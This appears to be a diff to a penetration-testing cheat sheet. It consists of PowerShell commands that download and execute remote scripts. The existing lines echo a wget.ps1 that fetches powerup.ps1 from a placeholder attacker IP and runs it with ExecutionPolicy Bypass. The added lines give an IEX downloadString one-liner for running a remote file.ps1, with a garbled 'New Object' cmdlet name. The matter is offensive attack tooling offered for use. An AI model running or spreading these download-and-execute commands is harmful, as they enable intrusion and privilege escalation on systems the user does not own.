@@ -63,3 +63,9 @@ echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
 echo $file = "powerup.ps1" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+--------------------------------------
+# Powershell download a file
+powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+
+
